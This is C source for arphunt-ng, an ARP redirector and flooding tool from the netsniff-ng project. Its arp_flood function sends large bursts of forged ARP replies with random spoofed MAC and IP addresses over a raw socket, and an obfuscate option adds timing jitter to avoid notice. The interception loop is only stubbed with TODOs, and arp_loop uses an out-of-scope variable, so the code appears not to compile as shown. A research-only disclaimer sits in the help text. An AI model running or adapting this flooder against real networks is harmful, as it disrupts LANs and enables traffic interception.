/*
 * netsniff-ng - the packet sniffing beast
 * By Daniel Borkmann <daniel@netsniff-ng.org>
 * Copyright 2009, 2010 Daniel Borkmann.
 * Subject to the GPL.
 */

/*
 * This rewrite is based on the work of FX <fx@phenoelit.de> ARP
 * redirector / IP bridge that is called ARP0c2.c.
 * This free software uses code and/or concepts developed by
 * Phenoelit (http://www.phenoelit.de) with the permission of the
 * original developers.
 */

#include <stdio.h>
#include <string.h>
#include <curses.h>
#include <getopt.h>
#include <ctype.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>

#include "error_and_die.h"
#include "xmalloc.h"
#include "system.h"
#include "timespec.h"
#include "compiler.h"
#include "tty.h"
#include "version.h"
#include "netdev.h"
#include "signals.h"
#include "strlcpy.h"
#include "mersenne_twister.h"
#include "bpf.h"
#include "hash.h"
#define __DATA__
#include "oui.h"
#undef __DATA__

#define DEFAULT_INTERCEPTS  2000
#define DEFAULT_ROUTES      32
#define DEFAULT_AGRESSIVE   64
#define REFRESH_CHECKS	    1

struct arp_entry {
	struct ether_addr eth;
	struct in_addr ip;
};

struct arp_table {
	struct arp_entry *entries;
	uint32_t count;
	uint32_t size;
};

struct refresh_entry {
	int fresh_flag;
	time_t check_time;
	struct ether_addr eth;
	struct in_addr requester_ip;
	struct in_addr requested_ip;
};

struct refresh_table {
	struct refresh_entry *entries;
	uint32_t count;
	uint32_t size;
};

struct routing_entry {
	struct in_addr network;
	struct in_addr netmask;
	struct in_addr gateway;
};

struct routing_table {
	struct routing_entry *entries;
	uint32_t count;
	uint32_t size;
};

struct agressive_entry {
	struct in_addr host1, host2;
};

struct agressive_table {
	struct agressive_entry *entries;
	uint32_t count;
	uint32_t size;
};

static sig_atomic_t sigint = 0;
static int verbose = 0;

static struct arp_table	arptable;
static struct refresh_table reftable;
static struct routing_table routetable;
static struct agressive_table agresstable;

static const char *short_options = "d:a:r:p:fnc:oVvh";

static struct option long_options[] = {
	{"dev", required_argument, 0, 'd'},
	{"agressive", required_argument, 0, 'a'},
	{"routing", required_argument, 0, 'r'},
	{"prefix", required_argument, 0, 'p'},
	{"count", required_argument, 0, 'c'},
	{"flood", no_argument, 0, 'f'},
	{"other", no_argument, 0, 'n'},
	{"obfuscate", no_argument, 0, 'o'},
	{"verbose", no_argument, 0, 'V'},
	{"version", no_argument, 0, 'v'},
	{"help", no_argument, 0, 'h'},
	{0, 0, 0, 0}
};

/* ARP header definition */

#define ARPOP_REQUEST   1    /* ARP request                */
#define ARPOP_REPLY     2    /* ARP reply                  */
#define ARPOP_RREQUEST  3    /* RARP request               */
#define ARPOP_RREPLY    4    /* RARP reply                 */
#define ARPOP_InREQUEST 8    /* InARP request              */
#define ARPOP_InREPLY   9    /* InARP reply                */
#define ARPOP_NAK       10   /* (ATM)ARP NAK               */

#define PROTO_ARP 0x0806 
#define PROTO_IP  0x0800

#define IP_ALEN         4

struct arppkt {
	uint8_t h_dest[6];   /* destination ether addr     */
	uint8_t h_source[6]; /* source ether addr          */
	uint16_t h_proto;    /* packet type ID field       */
	uint16_t ar_hrd;     /* format of hardware address */
	uint16_t ar_pro;     /* format of protocol address */
	uint8_t ar_hln;      /* length of hardware address */
	uint8_t ar_pln;      /* length of protocol address */
	uint16_t ar_op;      /* ARP opcode (command)       */
	uint8_t ar_sha[6];   /* sender hardware address    */
	uint8_t ar_sip[4];   /* sender IP address          */
	uint8_t ar_tha[6];   /* target hardware address    */
	uint8_t ar_tip[4];   /* target IP address          */
} __attribute__((packed));

//static struct arppkt pkt_arp_request;
static struct arppkt pkt_arp_response;

static struct hash_table ethernet_oui;

static void signal_handler(int number)
{
	switch (number) {
	case SIGINT:
		sigint = 1;
		break;
	case SIGHUP:
		break;
	case SIGUSR1:
		/* XXX Show tables */
		break;
	default:
		break;
	}
}

static void alarm_handler(int number)
{
//	arp_refresh();
//	if (agressive_goflag) 
//		arp_agressive_intercept();

	alarm(REFRESH_CHECKS);
}

static void help(void)
{
	printf("\narphunt-ng %s, the arp redirector\n", VERSION_STRING);
	printf("http://www.netsniff-ng.org\n\n");
	printf("Usage: arphunt-ng [options]\n");
	printf("Options:\n");
	printf("  -d|--dev <netdev>      Networking device\n");
	printf("  -a|--agressive <conn>  Agressive startup with known connections\n");
	printf("  -r|--routing <table>   Use table file for routing information\n");
	printf("  -f|--flood             Flood network with random ARP replies\n");
	printf("  -p|--prefix <pfix>     Use IP prefix like \'192.168\' for generation\n");
	printf("  -c|--count <num>       Flood with \'num\' packets and exit\n");
	printf("  -o|--obfuscate         Try to be more calm by adding jitter\n");
	printf("  -n|--other             Disable use of gratuitous replies\n");
	printf("  -V|--verbose           Be more verbose\n");
	printf("  -v|--version           Print version\n");
	printf("  -h|--help              Print this help\n");
	printf("\n");
	printf("Examples:\n");
	printf("  arphunt-ng --dev eth0 --flood --prefix 10.0\n");
	printf("  arphunt-ng --dev eth0 --agressive conn.txt --routing table.txt\n");
	printf("\n");
	printf("Note:\n");
	printf("  - Sending a SIGUSR1 will show internal lookup tables\n");
	printf("  - For more help try \'man arphunt-ng\'\n");
	printf("  - This tool has been written for research, so only use it\n");
	printf("    for such a purpose within an isolated testing network to\n");
	printf("    not cause damages! By using arphunt-ng you are agreeing\n");
	printf("    to this!\n");
	printf("\n");
	printf("Please report bugs to <bugs@netsniff-ng.org>\n");
	printf("Copyright (C) 2009, 2010 Daniel Borkmann\n");
	printf("License: GNU GPL version 2\n");
	printf("This is free software: you are free to change and redistribute it.\n");
	printf("There is NO WARRANTY, to the extent permitted by law.\n\n");

	exit(EXIT_SUCCESS);
}

static void version(void)
{
	printf("\narphunt-ng %s, the arp redirector\n", VERSION_STRING);
	printf("http://www.netsniff-ng.org\n\n");
	printf("Please report bugs to <bugs@netsniff-ng.org>\n");
	printf("Copyright (C) 2009, 2010 Daniel Borkmann\n");
	printf("License: GNU GPL version 2\n");
	printf("This is free software: you are free to change and redistribute it.\n");
	printf("There is NO WARRANTY, to the extent permitted by law.\n\n");

	exit(EXIT_SUCCESS);
}

static void init_oui_vendors(void)
{
	void **pos;
	size_t i, len = sizeof(vendor_db) / sizeof(struct vendor_id);

	init_hash(&ethernet_oui);
	for (i = 0; i < len; ++i) {
		pos = insert_hash(vendor_db[i].id, &vendor_db[i],
				  &ethernet_oui);
		if (pos) {
			vendor_db[i].next = *pos;
			*pos = &vendor_db[i];
		}
	}
}

static char *lookup_oui_vendor(unsigned int id)
{
	struct vendor_id *entry = lookup_hash(id, &ethernet_oui);
	while (entry && id != entry->id)
		entry = entry->next;
	return (entry && id == entry->id ? entry->vendor : NULL);
}

static int prefix_to_addr(char *prefix, uint8_t *ip_pre, size_t len)
{
	int ret = 0, flag = 0;
	char *pp = prefix;

	if (!prefix)
		return 0;
	memset(ip_pre, 0, len);

	/* prefix is null-terminated due to xstrdup */
	while (*prefix != 0) {
		if (*prefix == '.') {
			*prefix = 0;
			if (ret < len) {
				ip_pre[ret++] = atoi(pp);
				pp = ++prefix;
				continue;
			} else {
				flag = 1;
				break;
			}
		} else if (isdigit(*prefix)) {
			prefix++;
			continue;
		} else {
			error_and_die(EXIT_FAILURE, "No valid prefix provided!\n");
		}
	}

	if (!flag && isdigit(*(prefix - 1)))
		ip_pre[ret++] = atoi(pp);
	ret = ret == 4 ? 3 : ret;
	return ret;
}

static void parse_routing_table(const char *file)
{
	int ret, line = 0, routec = routetable.count;
	char buff[512];
	char *ptr, *ptrb;

	if (!file)
		return;

	FILE *fp = fopen(file, "r");
	if (!fp)
		error_and_die(EXIT_FAILURE, "Cannot read routing file!\n");

	printf("Routing table:\n");
	memset(buff, 0, sizeof(buff));

	/* Format: network_address <whitespace>+ netmask <whitespace>+ gateway */
	while (fgets(buff, sizeof(buff), fp) != NULL) {
		line++;

		buff[sizeof(buff) - 1] = 0;
		ptr = ptrb = buff;

		/* A comment. Skip this line */
		if (*ptr == '#') {
			memset(buff, 0, sizeof(buff));
			continue;
		}

		if (routec >= routetable.size) {
			routetable.size += 32;
			routetable.entries = xrealloc(routetable.entries, 1,
						      sizeof(*routetable.entries) *
						      routetable.size);
		}

		/* Skip whitespace */
		while (isblank(*ptr))
			ptr++;

		/* Network address */
		ptrb = ptr;
		while (isdigit(*ptr) || ispunct(*ptr))
			ptr++;
		*ptr = 0;
		ret = inet_aton(ptrb, &routetable.entries[routec].network);
		if (!ret)
			error_and_die(EXIT_FAILURE, "Cannot parse network address "
				      "at line %d!\n", line);
		ptr++;

		/* Skip whitespace */
		while (isblank(*ptr))
			ptr++;

		/* Netmask */
		ptrb = ptr;
		while (isdigit(*ptr) || ispunct(*ptr))
			ptr++;
		*ptr = 0;
		ret = inet_aton(ptrb, &routetable.entries[routec].netmask);
		if (!ret)
			error_and_die(EXIT_FAILURE, "Cannot parse netmask at "
				      "line %d!\n", line);
		ptr++;

		/* Skip whitespace */
		while (isblank(*ptr))
			ptr++;

		/* Gateway */
		ptrb = ptr;
		while (isdigit(*ptr) || ispunct(*ptr))
			ptr++;
		*ptr = 0;
		ret = inet_aton(ptrb, &routetable.entries[routec].gateway);
		if (!ret)
			error_and_die(EXIT_FAILURE, "Cannot parse gateway address at "
				      "line %d!\n", line);
		ptr++;

		/* This is a bug in inet_ntoa since it is using a static buffer! */
		printf("%d: %s/", line,
		       inet_ntoa(routetable.entries[routec].network));
		printf("%s via ",
		       inet_ntoa(routetable.entries[routec].netmask));
		printf("%s\n", 
		       inet_ntoa(routetable.entries[routec].gateway));

		memset(buff, 0, sizeof(buff));
		routec++;
	}

	routetable.count = routec;
	fclose(fp);
}

static void parse_connection_table(const char *file)
{
	int ret, line = 0, aggrc = agresstable.count;
	char buff[512];
	char *ptr, *ptrb;

	if (!file)
		return;

	FILE *fp = fopen(file, "r");
	if (!fp)
		error_and_die(EXIT_FAILURE, "Cannot read routing file!\n");

	printf("Agressive host table:\n");
	memset(buff, 0, sizeof(buff));

	/* Format: host1 <whitespace>+ host2 */
	while (fgets(buff, sizeof(buff), fp) != NULL) {
		line++;

		buff[sizeof(buff) - 1] = 0;
		ptr = ptrb = buff;

		/* A comment. Skip this line */
		if (buff[0] == '#') {
			memset(buff, 0, sizeof(buff));
			continue;
		}

		if (aggrc >= agresstable.size) {
			agresstable.size += 32;
			agresstable.entries = xrealloc(agresstable.entries, 1,
						       sizeof(*agresstable.entries) *
						       agresstable.size);
		}

		/* Skip whitespace */
		while (isblank(*ptr))
			ptr++;

		/* Host address 1 */
		ptrb = ptr;
		while (isdigit(*ptr) || ispunct(*ptr))
			ptr++;
		*ptr = 0;
		ret = inet_aton(ptrb, &agresstable.entries[aggrc].host1);
		if (!ret)
			error_and_die(EXIT_FAILURE, "Cannot parse host address 1 "
				      "at line %d!\n", line);
		ptr++;

		/* Skip whitespace */
		while (isblank(*ptr))
			ptr++;

		/* Host address 2 */
		ptrb = ptr;
		while (isdigit(*ptr) || ispunct(*ptr))
			ptr++;
		*ptr = 0;
		ret = inet_aton(ptrb, &agresstable.entries[aggrc].host2);
		if (!ret)
			error_and_die(EXIT_FAILURE, "Cannot parse host address 2 "
				      "at line %d!\n", line);
		ptr++;

		/* This is a bug in inet_ntoa since it is using a static buffer! */
		printf("%d: %s <=> ", line,
		       inet_ntoa(agresstable.entries[aggrc].host1));
		printf("%s\n",
		       inet_ntoa(agresstable.entries[aggrc].host2));

		memset(buff, 0, sizeof(buff));
		aggrc++;
	}

	agresstable.count = aggrc;
	fclose(fp);
}

static int arp_loop(const char *ifname, const char *routing_table,
		    const char *connections)
{
	int sock;

	printf("MD: RED%s\n\n", obfuscate ? " OBCTE" : "");

	arptable.entries = xmalloc(sizeof(*arptable.entries) * DEFAULT_INTERCEPTS);
	arptable.size = DEFAULT_INTERCEPTS;

	reftable.entries = xmalloc(sizeof(*reftable.entries) * DEFAULT_INTERCEPTS);
	reftable.size = DEFAULT_INTERCEPTS;

	routetable.entries = xmalloc(sizeof(*routetable.entries) * DEFAULT_ROUTES);
	routetable.size = DEFAULT_ROUTES;

	agresstable.entries = xmalloc(sizeof(*agresstable.entries) * DEFAULT_AGRESSIVE);
	agresstable.size = DEFAULT_AGRESSIVE;

	parse_routing_table(routing_table);
	parse_connection_table(connections);

	alarm(REFRESH_CHECKS);

	sock = pf_socket();

	/* TODO: send out agressive requests */

	/*
	 * Even if we would like this, but we cannot use a RX_RING here, because
	 * doing so would effect running netsniff-ng with its RX_RING. Binding a
	 * socket to the device would register the packet hook function in the
	 * kernel twice, so basically we would end up with a big mess. We're
	 * falling back to recvfrom(2) in this case and see if we can replace this
	 * with vmsplice(2) or others later.
	 */
	while (likely(!sigint)) {
		/* TODO: loop */
	}

	close(sock);
	xfree(arptable.entries);
	xfree(reftable.entries);
	xfree(routetable.entries);
	xfree(agresstable.entries);
	return 0;
}

static int arp_flood(const char *ifname, char *prefix, int obfuscate,
		     int count, int other)
{
	int i, j, limit, sock, pre_len, ifindex;
	uint32_t secs = mt_rand_int32() % 30;
	uint32_t vendor;
	uint8_t mac_addr[ETH_ALEN];
	uint8_t ip_addr[IP_ALEN];
	uint8_t ip_pre[IP_ALEN];
	double sleeptime = 0.0;
	ssize_t ret;
	struct in_addr ipa;
	struct sockaddr_ll s_addr;

	printf("MD: FLD%s\n\n", obfuscate ? " OBCTE" : "");

	sock = pf_socket();
	ifindex = device_ifindex(ifname);
	pre_len = prefix_to_addr(prefix, ip_pre, sizeof(ip_pre));

	while (likely(!sigint) && count != 0) {
		limit = obfuscate ? 1 + mt_rand_int32() % 10 : 1 + mt_rand_int32() % 12000;

		printf("Begin flooding %u pkts...\n", limit);

		for (i = 0; i < limit && count != 0; ++i) {
			memset(&pkt_arp_response, 0, sizeof(pkt_arp_response));

			pkt_arp_response.h_proto = htons(PROTO_ARP);
			pkt_arp_response.ar_hrd = htons(1);
			pkt_arp_response.ar_pro = htons(PROTO_IP);
			pkt_arp_response.ar_hln = ETH_ALEN;
			pkt_arp_response.ar_pln = IP_ALEN;
			pkt_arp_response.ar_op = htons(ARPOP_REPLY);

			vendor = mt_rand_int32() %
				 (sizeof(vendor_db) / sizeof(struct vendor_id));
			vendor = vendor_db[vendor].id;

			mac_addr[0] = (vendor >> 16) & 0xFF;
			mac_addr[1] = (vendor >>  8) & 0xFF; 
			mac_addr[2] = (vendor)       & 0xFF;

			for (j = 3; j < ETH_ALEN; ++j)
				mac_addr[j] = 1 + mt_rand_int32() % 255;

			for (j = 0; j < IP_ALEN; ++j) {
				if (j < pre_len)
					ip_addr[j] = ip_pre[j];
				else
					ip_addr[j] = 1 + mt_rand_int32() % 255;
			}

			memcpy(pkt_arp_response.h_source, mac_addr, ETH_ALEN);
			memcpy(pkt_arp_response.ar_sha, mac_addr, ETH_ALEN);
			memcpy(pkt_arp_response.ar_sip, ip_addr, IP_ALEN);

			vendor = mt_rand_int32() %
				 (sizeof(vendor_db) / sizeof(struct vendor_id));
			vendor = vendor_db[vendor].id;

			mac_addr[0] = (vendor >> 16) & 0xFF;
			mac_addr[1] = (vendor >>  8) & 0xFF; 
			mac_addr[2] = (vendor)       & 0xFF;

			for (j = 3; j < ETH_ALEN; ++j)
				mac_addr[j] = 1 + mt_rand_int32() % 255;

			if (other) {
				for (j = 0; j < IP_ALEN; ++j) {
					if (j < pre_len)
						ip_addr[j] = ip_pre[j];
					else
						ip_addr[j] = 1 + mt_rand_int32() % 255;
				}
			}

			memcpy(pkt_arp_response.h_dest, mac_addr, ETH_ALEN);
			memcpy(pkt_arp_response.ar_tha, mac_addr, ETH_ALEN);
			memcpy(pkt_arp_response.ar_tip, ip_addr, IP_ALEN);

			if (verbose) {
				memcpy(&ipa, ip_addr, IP_ALEN);
				print_green("%s is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x (%s)",
					    inet_ntoa(ipa), mac_addr[0], mac_addr[1],
					    mac_addr[2], mac_addr[3], mac_addr[4],
					    mac_addr[5],
					    lookup_oui_vendor((mac_addr[0] << 16) |
							      (mac_addr[1] <<  8) |
							      (mac_addr[2])));
			}

			memset(&s_addr, 0, sizeof(s_addr));
			s_addr.sll_family = PF_PACKET;
			s_addr.sll_protocol = htons(PROTO_ARP);
			s_addr.sll_halen = ETH_ALEN;
			s_addr.sll_ifindex = ifindex;

			ret = sendto(sock, &pkt_arp_response,
				     sizeof(pkt_arp_response), 0,
				     (struct sockaddr *) &s_addr, sizeof(s_addr));
			if (ret < 0) {
				perror("Cannot send arp packet! Interface down?");
				goto out;
			}

			if (ret != sizeof(pkt_arp_response))
				whine("Hmm.. wrong sent packet size!\n");

			/* We fake at least some time gap ... */
			xnanosleep(0.0001 * mt_rand_real3());
			if (count != -1)
				count--;
		}

		sleeptime =  obfuscate ? 1.0 + mt_rand_real3() * secs : 0.0;

		print_blue("Sleeping for %.6lf s", sleeptime);
		xnanosleep(sleeptime);
		print_blue("Waking up", sleeptime);
	}

out:
	close(sock);
	return 0;
}

static void header(void)
{
	printf("%s%s%s\n", colorize_start(bold), "arphunt-ng " 
	       VERSION_STRING, colorize_end());
}

int main(int argc, char **argv)
{
	int c, opt_index, ret, flood = 0, obfuscate = 0, count = -1, other = 0;
	char *ifname = NULL;
	char *routing_table = NULL;
	char *connections = NULL;
	char *prefix = NULL;

	check_for_root_maybe_die();

	memset(&arptable, 0, sizeof(arptable));
	memset(&reftable, 0, sizeof(reftable));
	memset(&routetable, 0, sizeof(routetable));
	memset(&agresstable, 0, sizeof(agresstable));

	while ((c = getopt_long(argc, argv, short_options, long_options,
	       &opt_index)) != EOF) {
		switch (c) {
		case 'h':
			help();
			break;
		case 'v':
			version();
			break;
		case 'd':
			ifname = xstrndup(optarg, IFNAMSIZ);
			break;
		case 'a':
			connections = xstrdup(optarg);
			break;
		case 'r':
			routing_table = xstrdup(optarg);
			break;
		case 'p':
			prefix = xstrdup(optarg);
			break;
		case 'f':
			flood = 1;
			break;
		case 'o':
			obfuscate = 1;
			break;
		case 'n':
			other = 1;
			break;
		case 'c':
			count = atoi(optarg);
			break;
		case 'V':
			verbose = 1;
			break;
		case '?':
			switch (optopt) {
			case 'd':
			case 'a':
			case 'p':
			case 'c':
			case 'r':
				error_and_die(EXIT_FAILURE, "Option -%c "
					      "requires an argument!\n",
					      optopt);
			default:
				if (isprint(optopt))
					whine("Unknown option character "
					      "`0x%X\'!\n", optopt);
				exit(EXIT_FAILURE);
			}
		default:
			break;
		}
	}

	if (argc == 1)
		help();
	if (!ifname)
		error_and_die(EXIT_FAILURE, "No networking device provided!\n");
	if (!strncmp("lo", ifname, IFNAMSIZ))
		error_and_die(EXIT_FAILURE, "lo is not supported!\n");
	if (device_mtu(ifname) == 0)
		error_and_die(EXIT_FAILURE, "This is no networking device!\n");

	register_signal(SIGINT, signal_handler);
	register_signal(SIGHUP, signal_handler);
	register_signal(SIGUSR1, signal_handler);
	register_signal(SIGSEGV, muntrace_handler);
	register_signal(SIGALRM, alarm_handler);

	mt_init_by_random_device();
	init_oui_vendors();

	header();

	if (flood)
		ret = arp_flood(ifname, prefix, obfuscate, count, other);
	else
		ret = arp_loop(ifname, routing_table, connections);

	xfree(ifname);
	if (prefix)
		xfree(prefix);
	if (routing_table)
		xfree(routing_table);
	if (connections)
		xfree(connections);
	return ret;
}

